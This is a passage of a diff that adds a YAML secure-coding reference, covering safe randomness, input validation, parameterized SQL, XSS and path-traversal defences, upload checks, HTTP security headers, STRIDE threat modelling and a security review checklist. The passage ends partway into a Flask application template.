+          def urlsafe(length: int) -> str:
+              """Generate URL-safe base64 string"""
+              return secrets.token_urlsafe(length)
+          
+          @staticmethod
+          def integer(min_val: int, max_val: int) -> int:
+              """Generate random integer in range [min_val, max_val]"""
+              return secrets.randbelow(max_val - min_val + 1) + min_val
+          
+          @staticmethod
+          def choice(sequence):
+              """Securely choose random element"""
+              return secrets.choice(sequence)
+          
+          @staticmethod
+          def shuffle(sequence: list) -> list:
+              """Securely shuffle a list (returns new list)"""
+              result = sequence.copy()
+              for i in range(len(result) - 1, 0, -1):
+                  j = secrets.randbelow(i + 1)
+                  result[i], result[j] = result[j], result[i]
+              return result
+      
+      # NEVER use these for security purposes:
+      # - random.random()
+      # - random.randint()
+      # - uuid.uuid4() for tokens (predictable in some implementations)
+    
+    use_cases:
+      session_ids: "secrets.token_urlsafe(32)  # 256 bits"
+      api_keys: "secrets.token_hex(32)  # 256 bits"
+      csrf_tokens: "secrets.token_urlsafe(32)"
+      password_reset: "secrets.token_urlsafe(32)"
+      encryption_keys: "secrets.token_bytes(32)  # AES-256"
+      nonces: "os.urandom(12)  # 96 bits for GCM"
+
+  common_crypto_mistakes:
+    - mistake: "Using ECB mode"
+      problem: "Identical plaintext blocks produce identical ciphertext"
+      fix: "Use GCM or CBC with random IV"
+    
+    - mistake: "Reusing nonces/IVs"
+      problem: "Catastrophic for GCM, patterns revealed in CBC"
+      fix: "Generate fresh random nonce for every encryption"
+    
+    - mistake: "Using encryption without authentication"
+      problem: "Attacker can modify ciphertext undetected"
+      fix: "Use AEAD modes (GCM) or encrypt-then-MAC"
+    
+    - mistake: "Rolling your own crypto"
+      problem: "Subtle bugs lead to complete breaks"
+      fix: "Use established libraries (cryptography, NaCl)"
+    
+    - mistake: "Hardcoding keys in source"
+      problem: "Keys exposed in version control"
+      fix: "Use environment variables, KMS, or HSM"
+    
+    - mistake: "Using MD5/SHA1 for integrity"
+      problem: "Collision attacks possible"
+      fix: "Use SHA-256 or SHA-3 minimum"
+    
+    - mistake: "Comparing hashes with =="
+      problem: "Timing attacks can leak hash values"
+      fix: "Use secrets.compare_digest() or hmac.compare_digest()"
+
+# =============================================================================
+# SECTION 4: INPUT VALIDATION & SANITIZATION
+# =============================================================================
+
+input_validation:
+  
+  principles:
+    - "Validate on server side (never trust client)"
+    - "Whitelist over blacklist"
+    - "Validate type, length, format, and range"
+    - "Sanitize output based on context"
+    - "Fail securely (reject on validation failure)"
+  
+  validation_patterns:
+    email: |
+      import re
+      from email_validator import validate_email, EmailNotValidError
+      
+      def validate_email_address(email: str) -> tuple[bool, str]:
+          """
+          Validate email format and deliverability.
+          Returns (is_valid, normalized_email_or_error)
+          """
+          try:
+              # This library handles complex RFC 5322 rules
+              valid = validate_email(email, check_deliverability=False)
+              return True, valid.normalized
+          except EmailNotValidError as e:
+              return False, str(e)
+    
+    username: |
+      import re
+      
+      def validate_username(username: str) -> tuple[bool, str]:
+          """
+          Username rules:
+          - 3-30 characters
+          - Alphanumeric, underscore, hyphen only
+          - Must start with letter
+          """
+          if not username:
+              return False, "Username required"
+          
+          if len(username) < 3:
+              return False, "Username must be at least 3 characters"
+          
+          if len(username) > 30:
+              return False, "Username must be at most 30 characters"
+          
+          if not re.match(r'^[a-zA-Z][a-zA-Z0-9_-]*$', username):
+              return False, "Username must start with letter, contain only letters, numbers, underscore, hyphen"
+          
+          return True, username.lower()
+    
+    phone: |
+      import phonenumbers
+      
+      def validate_phone(phone: str, country: str = 'US') -> tuple[bool, str]:
+          """Validate and normalize phone number"""
+          try:
+              parsed = phonenumbers.parse(phone, country)
+              if not phonenumbers.is_valid_number(parsed):
+                  return False, "Invalid phone number"
+              # Return E.164 format
+              return True, phonenumbers.format_number(
+                  parsed, phonenumbers.PhoneNumberFormat.E164
+              )
+          except Exception as e:
+              return False, f"Invalid phone format: {e}"
+    
+    url: |
+      from urllib.parse import urlparse
+      
+      def validate_url(url: str, allowed_schemes: list = None) -> tuple[bool, str]:
+          """
+          Validate URL format and scheme.
+          Prevents SSRF by validating scheme and optionally host.
+          """
+          if allowed_schemes is None:
+              allowed_schemes = ['https']  # Default to HTTPS only
+          
+          try:
+              parsed = urlparse(url)
+              
+              if parsed.scheme not in allowed_schemes:
+                  return False, f"URL scheme must be one of: {allowed_schemes}"
+              
+              if not parsed.netloc:
+                  return False, "URL must have a host"
+              
+              # Block internal IPs (SSRF prevention)
+              import ipaddress
+              try:
+                  ip = ipaddress.ip_address(parsed.hostname)
+                  if ip.is_private or ip.is_loopback or ip.is_reserved:
+                      return False, "Internal URLs not allowed"
+              except ValueError:
+                  pass  # Not an IP address, that's fine
+              
+              return True, url
+          except Exception as e:
+              return False, f"Invalid URL: {e}"
+
+  sql_parameterization:
+    raw_sql: |
+      # SECURE: Using psycopg2 with parameters
+      import psycopg2
+      
+      def search_users(conn, name_pattern: str, min_age: int):
+          cursor = conn.cursor()
+          # %s placeholders are replaced safely
+          cursor.execute(
+              """
+              SELECT id, name, email 
+              FROM users 
+              WHERE name ILIKE %s AND age >= %s
+              """,
+              (f'%{name_pattern}%', min_age)
+          )
+          return cursor.fetchall()
+      
+      # SECURE: Named parameters
+      def get_user_orders(conn, user_id: int, status: str):
+          cursor = conn.cursor()
+          cursor.execute(
+              """
+              SELECT * FROM orders 
+              WHERE user_id = %(user_id)s AND status = %(status)s
+              """,
+              {'user_id': user_id, 'status': status}
+          )
+          return cursor.fetchall()
+    
+    sqlalchemy_orm: |
+      from sqlalchemy import and_, or_, func
+      from sqlalchemy.orm import Session
+      
+      def search_products(db: Session, query: str, category: str = None,
+                          min_price: float = None, max_price: float = None):
+          """SQLAlchemy handles parameterization automatically"""
+          
+          filters = []
+          
+          if query:
+              # Use ilike for case-insensitive LIKE
+              filters.append(Product.name.ilike(f'%{query}%'))
+          
+          if category:
+              filters.append(Product.category == category)
+          
+          if min_price is not None:
+              filters.append(Product.price >= min_price)
+          
+          if max_price is not None:
+              filters.append(Product.price <= max_price)
+          
+          return db.query(Product).filter(and_(*filters)).all()
+      
+      # For raw SQL when needed (still parameterized)
+      from sqlalchemy import text
+      
+      def custom_query(db: Session, status: str):
+          result = db.execute(
+              text("SELECT * FROM orders WHERE status = :status"),
+              {"status": status}
+          )
+          return result.fetchall()
+
+  xss_prevention:
+    output_encoding: |
+      from markupsafe import escape, Markup
+      import html
+      import json
+      
+      class OutputEncoder:
+          """Context-aware output encoding"""
+          
+          @staticmethod
+          def html(value: str) -> str:
+              """Encode for HTML body context"""
+              return escape(value)
+          
+          @staticmethod
+          def html_attribute(value: str) -> str:
+              """Encode for HTML attribute context"""
+              # Double-encode to handle attribute context
+              return escape(value).replace('"', '&quot;').replace("'", '&#x27;')
+          
+          @staticmethod
+          def javascript(value: str) -> str:
+              """Encode for JavaScript string context"""
+              # JSON encoding handles JS escaping
+              return json.dumps(value)
+          
+          @staticmethod
+          def url(value: str) -> str:
+              """Encode for URL parameter context"""
+              from urllib.parse import quote
+              return quote(value, safe='')
+          
+          @staticmethod
+          def css(value: str) -> str:
+              """Encode for CSS context"""
+              # Only allow alphanumeric and safe chars
+              import re
+              if not re.match(r'^[a-zA-Z0-9\s\-_#.]+$', value):
+                  return ''
+              return value
+      
+      # Jinja2 configuration for auto-escaping
+      from jinja2 import Environment, select_autoescape
+      
+      env = Environment(
+          autoescape=select_autoescape(
+              enabled_extensions=('html', 'htm', 'xml'),
+              default_for_string=True,
+          )
+      )
+    
+    content_security_policy: |
+      # Prevent inline script execution (XSS mitigation)
+      csp_policy = {
+          "default-src": "'self'",
+          "script-src": "'self'",  # No 'unsafe-inline'!
+          "style-src": "'self' 'unsafe-inline'",  # Inline styles often needed
+          "img-src": "'self' data: https:",
+          "font-src": "'self'",
+          "connect-src": "'self'",
+          "frame-ancestors": "'none'",
+          "base-uri": "'self'",
+          "form-action": "'self'"
+      }
+
+  path_traversal_prevention:
+    implementation: |
+      import os
+      from pathlib import Path
+      
+      class SecureFileHandler:
+          """Prevent path traversal attacks"""
+          
+          def __init__(self, base_directory: str):
+              self.base_dir = Path(base_directory).resolve()
+          
+          def safe_join(self, filename: str) -> Path:
+              """
+              Safely join filename to base directory.
+              Raises ValueError if path escapes base directory.
+              """
+              # Remove null bytes
+              filename = filename.replace('\x00', '')
+              
+              # Normalize and resolve
+              target = (self.base_dir / filename).resolve()
+              
+              # Verify path is under base directory
+              try:
+                  target.relative_to(self.base_dir)
+              except ValueError:
+                  raise ValueError(f"Path traversal attempt: {filename}")
+              
+              return target
+          
+          def read_file(self, filename: str) -> bytes:
+              """Safely read file"""
+              path = self.safe_join(filename)
+              
+              # Additional checks
+              if not path.is_file():
+                  raise FileNotFoundError(f"File not found: {filename}")
+              
+              # Check file extension whitelist
+              allowed_extensions = {'.txt', '.pdf', '.jpg', '.png'}
+              if path.suffix.lower() not in allowed_extensions:
+                  raise ValueError(f"File type not allowed: {path.suffix}")
+              
+              return path.read_bytes()
+          
+          def save_file(self, filename: str, content: bytes) -> Path:
+              """Safely save file"""
+              # Sanitize filename
+              safe_name = self.sanitize_filename(filename)
+              path = self.safe_join(safe_name)
+              
+              # Ensure parent directory exists
+              path.parent.mkdir(parents=True, exist_ok=True)
+              
+              path.write_bytes(content)
+              return path
+          
+          @staticmethod
+          def sanitize_filename(filename: str) -> str:
+              """Remove dangerous characters from filename"""
+              import re
+              # Keep only alphanumeric, dash, underscore, dot
+              name = re.sub(r'[^a-zA-Z0-9\-_.]', '_', filename)
+              # Remove leading dots (hidden files)
+              name = name.lstrip('.')
+              # Limit length
+              return name[:255] if name else 'unnamed'
+
+  file_upload_security:
+    implementation: |
+      import magic
+      import hashlib
+      from pathlib import Path
+      from werkzeug.utils import secure_filename
+      
+      class SecureFileUpload:
+          """Secure file upload handling"""
+          
+          ALLOWED_MIMETYPES = {
+              'image/jpeg': ['.jpg', '.jpeg'],
+              'image/png': ['.png'],
+              'image/gif': ['.gif'],
+              'application/pdf': ['.pdf'],
+              'text/plain': ['.txt'],
+          }
+          
+          MAX_FILE_SIZE = 10 * 1024 * 1024  # 10 MB
+          
+          def __init__(self, upload_directory: str):
+              self.upload_dir = Path(upload_directory)
+              self.upload_dir.mkdir(parents=True, exist_ok=True)
+          
+          def validate_file(self, file_storage) -> tuple[bool, str]:
+              """
+              Validate uploaded file.
+              Returns (is_valid, error_message)
+              """
+              # Check file size
+              file_storage.seek(0, 2)  # Seek to end
+              size = file_storage.tell()
+              file_storage.seek(0)  # Reset
+              
+              if size > self.MAX_FILE_SIZE:
+                  return False, f"File too large (max {self.MAX_FILE_SIZE // 1024 // 1024}MB)"
+              
+              if size == 0:
+                  return False, "Empty file"
+              
+              # Read magic bytes to detect actual type
+              header = file_storage.read(2048)
+              file_storage.seek(0)
+              
+              detected_mime = magic.from_buffer(header, mime=True)
+              
+              if detected_mime not in self.ALLOWED_MIMETYPES:
+                  return False, f"File type not allowed: {detected_mime}"
+              
+              # Verify extension matches content
+              filename = secure_filename(file_storage.filename or '')
+              ext = Path(filename).suffix.lower()
+              
+              if ext not in self.ALLOWED_MIMETYPES[detected_mime]:
+                  return False, "File extension doesn't match content type"
+              
+              return True, ""
+          
+          def save_upload(self, file_storage, custom_name: str = None) -> dict:
+              """
+              Validate and save uploaded file.
+              Returns metadata about saved file.
+              """
+              is_valid, error = self.validate_file(file_storage)
+              if not is_valid:
+                  raise ValueError(error)
+              
+              # Generate unique filename (don't trust user filename)
+              content = file_storage.read()
+              file_storage.seek(0)
+              
+              content_hash = hashlib.sha256(content).hexdigest()[:16]
+              ext = Path(secure_filename(file_storage.filename)).suffix.lower()
+              
+              if custom_name:
+                  safe_name = secure_filename(custom_name)
+                  new_filename = f"{safe_name}_{content_hash}{ext}"
+              else:
+                  new_filename = f"{content_hash}{ext}"
+              
+              # Save to upload directory
+              save_path = self.upload_dir / new_filename
+              save_path.write_bytes(content)
+              
+              return {
+                  'filename': new_filename,
+                  'original_name': file_storage.filename,
+                  'size': len(content),
+                  'hash': content_hash,
+                  'mime_type': magic.from_buffer(content, mime=True),
+                  'path': str(save_path)
+              }
+
+# =============================================================================
+# SECTION 5: SECURITY HEADERS
+# =============================================================================
+
+security_headers:
+  
+  content_security_policy:
+    description: "Controls resources the browser can load"
+    importance: critical
+    
+    directives:
+      default-src:
+        description: "Fallback for other directives"
+        recommended: "'self'"
+      
+      script-src:
+        description: "Valid sources for JavaScript"
+        recommended: "'self'"
+        avoid:
+          - "'unsafe-inline'"
+          - "'unsafe-eval'"
+        notes: "Use nonces or hashes for inline scripts if needed"
+      
+      style-src:
+        description: "Valid sources for stylesheets"
+        recommended: "'self' 'unsafe-inline'"
+        notes: "unsafe-inline often needed for frameworks"
+      
+      img-src:
+        description: "Valid sources for images"
+        recommended: "'self' data: https:"
+      
+      connect-src:
+        description: "URLs for fetch, WebSocket, etc."
+        recommended: "'self' https://api.example.com"
+      
+      frame-ancestors:
+        description: "Valid parents for embedding (replaces X-Frame-Options)"
+        recommended: "'none'"
+        notes: "Prevents clickjacking"
+      
+      base-uri:
+        description: "Valid URLs for <base> element"
+        recommended: "'self'"
+      
+      form-action:
+        description: "Valid URLs for form submission"
+        recommended: "'self'"
+      
+      upgrade-insecure-requests:
+        description: "Upgrade HTTP to HTTPS"
+        recommended: "include directive"
+    
+    examples:
+      strict: |
+        Content-Security-Policy: 
+          default-src 'self';
+          script-src 'self';
+          style-src 'self' 'unsafe-inline';
+          img-src 'self' data: https:;
+          font-src 'self';
+          connect-src 'self';
+          frame-ancestors 'none';
+          base-uri 'self';
+          form-action 'self';
+          upgrade-insecure-requests
+      
+      with_nonce: |
+        # Server generates random nonce per request
+        Content-Security-Policy: script-src 'nonce-{random_nonce}'
+        
+        # In HTML:
+        <script nonce="{random_nonce}">
+          // Inline script allowed with matching nonce
+        </script>
+
+  strict_transport_security:
+    description: "Force HTTPS connections"
+    importance: critical
+    
+    header: "Strict-Transport-Security"
+    
+    directives:
+      max-age:
+        description: "Duration in seconds to remember HTTPS requirement"
+        recommended: 31536000  # 1 year
+        minimum: 15768000  # 6 months for HSTS preload
+      
+      includeSubDomains:
+        description: "Apply to all subdomains"
+        recommended: true
+        notes: "Ensure ALL subdomains support HTTPS first"
+      
+      preload:
+        description: "Submit to browser preload list"
+        recommended: true
+        notes: "Submit at hstspreload.org after testing"
+    
+    example: "Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"
+
+  x_content_type_options:
+    description: "Prevent MIME type sniffing"
+    importance: high
+    
+    header: "X-Content-Type-Options"
+    value: "nosniff"
+    
+    purpose: |
+      Prevents browser from interpreting files as different MIME type.
+      Mitigates attacks where attacker uploads malicious file with
+      harmless extension.
+    
+    example: "X-Content-Type-Options: nosniff"
+
+  x_frame_options:
+    description: "Prevent clickjacking"
+    importance: high
+    note: "Superseded by CSP frame-ancestors, but include for compatibility"
+    
+    header: "X-Frame-Options"
+    
+    values:
+      DENY: "Page cannot be embedded in any frame"
+      SAMEORIGIN: "Page can only be embedded by same origin"
+    
+    example: "X-Frame-Options: DENY"
+
+  referrer_policy:
+    description: "Control Referer header information"
+    importance: medium
+    
+    header: "Referrer-Policy"
+    
+    values:
+      no-referrer: "Never send Referer"
+      same-origin: "Only send for same-origin requests"
+      strict-origin: "Send origin only, HTTPS only"
+      strict-origin-when-cross-origin: "Full URL same-origin, origin cross-origin"
+    
+    recommended: "strict-origin-when-cross-origin"
+    example: "Referrer-Policy: strict-origin-when-cross-origin"
+
+  permissions_policy:
+    description: "Control browser features (was Feature-Policy)"
+    importance: medium
+    
+    header: "Permissions-Policy"
+    
+    common_features:
+      - "geolocation=()"        
+      - "microphone=()"         
+      - "camera=()"             
+      - "payment=()"            
+      - "usb=()"                
+    
+    example: "Permissions-Policy: geolocation=(), microphone=(), camera=()"
+
+  implementation:
+    flask: |
+      from flask import Flask
+      from flask_talisman import Talisman
+      
+      app = Flask(__name__)
+      
+      csp = {
+          'default-src': "'self'",
+          'script-src': "'self'",
+          'style-src': "'self' 'unsafe-inline'",
+          'img-src': "'self' data: https:",
+          'font-src': "'self'",
+          'connect-src': "'self'",
+          'frame-ancestors': "'none'",
+          'base-uri': "'self'",
+          'form-action': "'self'"
+      }
+      
+      Talisman(
+          app,
+          force_https=True,
+          strict_transport_security=True,
+          strict_transport_security_max_age=31536000,
+          strict_transport_security_include_subdomains=True,
+          strict_transport_security_preload=True,
+          content_security_policy=csp,
+          content_security_policy_nonce_in=['script-src'],
+          referrer_policy='strict-origin-when-cross-origin',
+          permissions_policy={
+              'geolocation': '()',
+              'microphone': '()',
+              'camera': '()'
+          },
+          session_cookie_secure=True,
+          session_cookie_http_only=True,
+          session_cookie_samesite='Lax'
+      )
+    
+    fastapi: |
+      from fastapi import FastAPI
+      from starlette.middleware.trustedhost import TrustedHostMiddleware
+      from fastapi.middleware.cors import CORSMiddleware
+      import secrets
+      
+      app = FastAPI()
+      
+      # Add security headers middleware
+      @app.middleware("http")
+      async def add_security_headers(request, call_next):
+          response = await call_next(request)
+          
+          # Generate nonce for CSP
+          nonce = secrets.token_urlsafe(16)
+          
+          response.headers["X-Content-Type-Options"] = "nosniff"
+          response.headers["X-Frame-Options"] = "DENY"
+          response.headers["X-XSS-Protection"] = "0"  # Disabled, can cause issues
+          response.headers["Referrer-Policy"] = "strict-origin-when-cross-origin"
+          response.headers["Permissions-Policy"] = "geolocation=(), microphone=(), camera=()"
+          
+          csp = (
+              "default-src 'self'; "
+              f"script-src 'self' 'nonce-{nonce}'; "
+              "style-src 'self' 'unsafe-inline'; "
+              "img-src 'self' data: https:; "
+              "font-src 'self'; "
+              "connect-src 'self'; "
+              "frame-ancestors 'none'; "
+              "base-uri 'self'; "
+              "form-action 'self'"
+          )
+          response.headers["Content-Security-Policy"] = csp
+          
+          if request.url.scheme == "https":
+              response.headers["Strict-Transport-Security"] = (
+                  "max-age=31536000; includeSubDomains; preload"
+              )
+          
+          return response
+      
+      # Trusted hosts
+      app.add_middleware(
+          TrustedHostMiddleware,
+          allowed_hosts=["example.com", "*.example.com"]
+      )
+    
+    nginx: |
+      # Add to nginx.conf or site configuration
+      
+      # HSTS
+      add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload" always;
+      
+      # Content Security Policy
+      add_header Content-Security-Policy "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:; font-src 'self'; connect-src 'self'; frame-ancestors 'none'; base-uri 'self'; form-action 'self'" always;
+      
+      # Prevent MIME sniffing
+      add_header X-Content-Type-Options "nosniff" always;
+      
+      # Clickjacking protection
+      add_header X-Frame-Options "DENY" always;
+      
+      # Referrer Policy
+      add_header Referrer-Policy "strict-origin-when-cross-origin" always;
+      
+      # Permissions Policy
+      add_header Permissions-Policy "geolocation=(), microphone=(), camera=()" always;
+
+# =============================================================================
+# SECTION 6: THREAT MODELING
+# =============================================================================
+
+threat_modeling:
+  
+  stride_methodology:
+    description: |
+      STRIDE is a threat modeling framework developed by Microsoft.
+      Each letter represents a threat category.
+    
+    categories:
+      spoofing:
+        definition: "Pretending to be someone/something else"
+        examples:
+          - "Session hijacking"
+          - "Credential theft"
+          - "Man-in-the-middle attacks"
+          - "IP spoofing"
+        mitigations:
+          - "Strong authentication (MFA)"
+          - "Session management best practices"
+          - "Certificate validation"
+          - "Mutual TLS"
+        security_property: "Authentication"
+      
+      tampering:
+        definition: "Unauthorized modification of data"
+        examples:
+          - "SQL injection"
+          - "Cross-site scripting"
+          - "Parameter manipulation"
+          - "Man-in-the-middle modification"
+        mitigations:
+          - "Input validation"
+          - "Digital signatures"
+          - "Message authentication codes"
+          - "Integrity checks"
+        security_property: "Integrity"
+      
+      repudiation:
+        definition: "Denying an action took place"
+        examples:
+          - "User denies making a transaction"
+          - "Admin denies deleting records"
+          - "No proof of actions taken"
+        mitigations:
+          - "Audit logging"
+          - "Digital signatures"
+          - "Timestamps"
+          - "Non-repudiation mechanisms"
+        security_property: "Non-repudiation"
+      
+      information_disclosure:
+        definition: "Unauthorized access to information"
+        examples:
+          - "Data breach"
+          - "Error message information leakage"
+          - "Directory listing"
+          - "Backup file exposure"
+        mitigations:
+          - "Encryption at rest and in transit"
+          - "Access control"
+          - "Data classification"
+          - "Minimal error messages"
+        security_property: "Confidentiality"
+      
+      denial_of_service:
+        definition: "Making system unavailable"
+        examples:
+          - "DDoS attacks"
+          - "Resource exhaustion"
+          - "Algorithmic complexity attacks"
+          - "Application-layer DoS"
+        mitigations:
+          - "Rate limiting"
+          - "Resource quotas"
+          - "Input size limits"
+          - "CDN and WAF"
+        security_property: "Availability"
+      
+      elevation_of_privilege:
+        definition: "Gaining higher access than authorized"
+        examples:
+          - "Exploiting buffer overflow"
+          - "SQL injection for admin access"
+          - "Insecure direct object reference"
+          - "Missing function-level access control"
+        mitigations:
+          - "Principle of least privilege"
+          - "Input validation"
+          - "Secure coding practices"
+          - "Defense in depth"
+        security_property: "Authorization"
+    
+    process:
+      - step: 1
+        name: "Identify Assets"
+        description: "What are we protecting?"
+        activities:
+          - "List sensitive data (PII, credentials, financial)"
+          - "Identify critical functionality"
+          - "Map trust boundaries"
+      
+      - step: 2
+        name: "Create Architecture Diagram"
+        description: "Visual representation of system"
+        activities:
+          - "Draw data flow diagrams"
+          - "Identify entry points"
+          - "Mark trust boundaries"
+      
+      - step: 3
+        name: "Identify Threats"
+        description: "Apply STRIDE to each component"
+        activities:
+          - "Walk through each data flow"
+          - "Ask STRIDE questions for each element"
+          - "Document potential threats"
+      
+      - step: 4
+        name: "Assess Risks"
+        description: "Prioritize threats by risk"
+        activities:
+          - "Calculate likelihood and impact"
+          - "Use risk matrix"
+          - "Rank threats"
+      
+      - step: 5
+        name: "Plan Mitigations"
+        description: "Address highest priority threats"
+        activities:
+          - "Design security controls"
+          - "Document residual risk"
+          - "Create security requirements"
+
+  attack_trees:
+    description: |
+      Attack trees are diagrams showing how an asset can be attacked.
+      Root node is the goal, children are ways to achieve parent goal.
+    
+    example:
+      goal: "Steal User Credentials"
+      branches:
+        - method: "Phishing"
+          sub_methods:
+            - "Spear phishing email"
+            - "Fake login page"
+            - "SMS phishing"
+          mitigations:
+            - "User training"
+            - "Email filtering"
+            - "MFA"
+        
+        - method: "Application Vulnerability"
+          sub_methods:
+            - "SQL injection to dump database"
+            - "XSS to steal session"
+            - "Broken authentication"
+          mitigations:
+            - "Parameterized queries"
+            - "CSP headers"
+            - "Secure session management"
+        
+        - method: "Network Attack"
+          sub_methods:
+            - "Man-in-the-middle"
+            - "WiFi eavesdropping"
+            - "DNS spoofing"
+          mitigations:
+            - "HTTPS everywhere"
+            - "Certificate pinning"
+            - "HSTS"
+        
+        - method: "Credential Stuffing"
+          sub_methods:
+            - "Use breached credentials"
+            - "Password spraying"
+            - "Brute force"
+          mitigations:
+            - "Rate limiting"
+            - "Account lockout"
+            - "MFA"
+            - "Password breach checking"
+
+  risk_assessment_matrix:
+    description: "Qualitative risk assessment based on likelihood and impact"
+    
+    likelihood_levels:
+      rare: 1
+      unlikely: 2
+      possible: 3
+      likely: 4
+      certain: 5
+    
+    impact_levels:
+      negligible: 1
+      minor: 2
+      moderate: 3
+      major: 4
+      catastrophic: 5
+    
+    risk_calculation: "Risk Score = Likelihood × Impact"
+    
+    risk_ratings:
+      low: "1-6"
+      medium: "7-12"
+      high: "13-19"
+      critical: "20-25"
+    
+    matrix: |
+      Impact →        | Negligible | Minor | Moderate | Major | Catastrophic
+      Likelihood ↓    |     1      |   2   |    3     |   4   |      5
+      ─────────────────────────────────────────────────────────────────────
+      Rare (1)        |     1      |   2   |    3     |   4   |      5
+      Unlikely (2)    |     2      |   4   |    6     |   8   |     10
+      Possible (3)    |     3      |   6   |    9     |  12   |     15
+      Likely (4)      |     4      |   8   |   12     |  16   |     20
+      Certain (5)     |     5      |  10   |   15     |  20   |     25
+
+  security_requirements_template:
+    authentication:
+      - "All authentication must use secure password hashing (Argon2id)"
+      - "Multi-factor authentication must be available for all users"
+      - "Session tokens must be cryptographically random (256 bits minimum)"
+      - "Sessions must expire after 24 hours maximum"
+      - "Failed login attempts must trigger progressive lockout"
+    
+    authorization:
+      - "All API endpoints must enforce authorization checks"
+      - "Principle of least privilege must be applied"
+      - "Role-based access control must be implemented"
+      - "Direct object references must be validated"
+    
+    data_protection:
+      - "All sensitive data must be encrypted at rest (AES-256)"
+      - "All data in transit must use TLS 1.2+"
+      - "PII must be classified and access logged"
+      - "Encryption keys must be stored in KMS/HSM"
+    
+    input_validation:
+      - "All user input must be validated server-side"
+      - "SQL queries must use parameterized statements"
+      - "Output must be encoded based on context"
+      - "File uploads must validate type and size"
+    
+    logging_and_monitoring:
+      - "All authentication events must be logged"
+      - "All authorization failures must be logged"
+      - "Logs must be protected from tampering"
+      - "Security alerts must be configured for anomalies"
+
+# =============================================================================
+# SECTION 7: SECURITY REVIEW CHECKLIST
+# =============================================================================
+
+security_review_checklist:
+  
+  authentication:
+    - id: "AUTH-001"
+      check: "Passwords hashed with Argon2id or bcrypt"
+      severity: critical
+      
+    - id: "AUTH-002"
+      check: "Password policy enforces minimum 12 characters"
+      severity: high
+      
+    - id: "AUTH-003"
+      check: "MFA available and encouraged"
+      severity: high
+      
+    - id: "AUTH-004"
+      check: "Account lockout after failed attempts"
+      severity: high
+      
+    - id: "AUTH-005"
+      check: "Secure password reset flow (token-based)"
+      severity: critical
+      
+    - id: "AUTH-006"
+      check: "Session tokens are cryptographically random"
+      severity: critical
+      
+    - id: "AUTH-007"
+      check: "Sessions expire and can be revoked"
+      severity: high
+
+  authorization:
+    - id: "AUTHZ-001"
+      check: "All endpoints enforce authorization"
+      severity: critical
+      
+    - id: "AUTHZ-002"
+      check: "IDOR vulnerabilities checked"
+      severity: critical
+      
+    - id: "AUTHZ-003"
+      check: "Privilege escalation prevented"
+      severity: critical
+      
+    - id: "AUTHZ-004"
+      check: "Deny by default policy"
+      severity: high
+
+  injection:
+    - id: "INJ-001"
+      check: "SQL queries use parameterized statements"
+      severity: critical
+      
+    - id: "INJ-002"
+      check: "NoSQL injection prevented"
+      severity: critical
+      
+    - id: "INJ-003"
+      check: "Command injection prevented (no shell=True)"
+      severity: critical
+      
+    - id: "INJ-004"
+      check: "XSS prevented with output encoding"
+      severity: critical
+      
+    - id: "INJ-005"
+      check: "Template injection prevented"
+      severity: critical
+
+  cryptography:
+    - id: "CRYPTO-001"
+      check: "TLS 1.2+ for all connections"
+      severity: critical
+      
+    - id: "CRYPTO-002"
+      check: "Strong cipher suites only"
+      severity: high
+      
+    - id: "CRYPTO-003"
+      check: "No hardcoded secrets in code"
+      severity: critical
+      
+    - id: "CRYPTO-004"
+      check: "Keys stored in KMS/HSM or env vars"
+      severity: critical
+      
+    - id: "CRYPTO-005"
+      check: "Secure random number generation"
+      severity: critical
+
+  headers:
+    - id: "HDR-001"
+      check: "Content-Security-Policy configured"
+      severity: high
+      
+    - id: "HDR-002"
+      check: "HSTS enabled with long max-age"
+      severity: high
+      
+    - id: "HDR-003"
+      check: "X-Content-Type-Options: nosniff"
+      severity: medium
+      
+    - id: "HDR-004"
+      check: "X-Frame-Options or CSP frame-ancestors"
+      severity: medium
+
+  data_handling:
+    - id: "DATA-001"
+      check: "Sensitive data encrypted at rest"
+      severity: critical
+      
+    - id: "DATA-002"
+      check: "PII minimization practiced"
+      severity: high
+      
+    - id: "DATA-003"
+      check: "Secure deletion of sensitive data"
+      severity: high
+      
+    - id: "DATA-004"
+      check: "No sensitive data in logs"
+      severity: critical
+
+  file_handling:
+    - id: "FILE-001"
+      check: "File uploads validate content type"
+      severity: high
+      
+    - id: "FILE-002"
+      check: "Path traversal prevented"
+      severity: critical
+      
+    - id: "FILE-003"
+      check: "Uploaded files stored outside webroot"
+      severity: high
+      
+    - id: "FILE-004"
+      check: "File size limits enforced"
+      severity: medium
+
+  logging:
+    - id: "LOG-001"
+      check: "Authentication events logged"
+      severity: high
+      
+    - id: "LOG-002"
+      check: "Authorization failures logged"
+      severity: high
+      
+    - id: "LOG-003"
+      check: "No sensitive data in logs"
+      severity: critical
+      
+    - id: "LOG-004"
+      check: "Log integrity protected"
+      severity: medium
+
+  api_security:
+    - id: "API-001"
+      check: "Rate limiting implemented"
+      severity: high
+      
+    - id: "API-002"
+      check: "Input validation on all endpoints"
+      severity: critical
+      
+    - id: "API-003"
+      check: "API versioning implemented"
+      severity: medium
+      
+    - id: "API-004"
+      check: "CORS configured properly"
+      severity: high
+
+# =============================================================================
+# SECTION 8: COMPLETE SECURE APPLICATION TEMPLATE
+# =============================================================================
+
+secure_application_template:
+  description: "Complete Flask application with security best practices"
+  
+  code: |
+    """
+    Secure Flask Application Template
+    Implements OWASP security best practices
+    """
+    
+    from flask import Flask, request, jsonify, g
+    from flask_talisman import Talisman
+    from flask_limiter import Limiter
+    from flask_limiter.util import get_remote_address
+    from functools import wraps
+    import secrets
+    import logging
+    from datetime import datetime
+    
+    # Initialize Flask app
+    app = Flask(__name__)
+    app.config.from_object('config.ProductionConfig')
+    
+    # ===================
+    # SECURITY MIDDLEWARE
+    # ===================
+    
+    # Content Security Policy
+    csp = {
+        'default-src': "'self'",
+        'script-src': "'self'",
+        'style-src': "'self' 'unsafe-inline'",
+        'img-src': "'self' data: https:",
+        'font-src': "'self'",
+        'connect-src': "'self'",
+        'frame-ancestors': "'none'",
+        'base-uri': "'self'",
+        'form-action': "'self'"
+    }
+    
+    # Initialize Talisman for security headers
+    talisman = Talisman(
+        app,
+        force_https=True,
+        strict_transport_security=True,
+        strict_transport_security_max_age=31536000,
+        content_security_policy=csp,
+        referrer_policy='strict-origin-when-cross-origin',
+        session_cookie_secure=True,
+        session_cookie_http_only=True,
+        session_cookie_samesite='Lax'
+    )
+    
+    # Rate limiting
+    limiter = Limiter(
+        app=app,
+        key_func=get_remote_address,
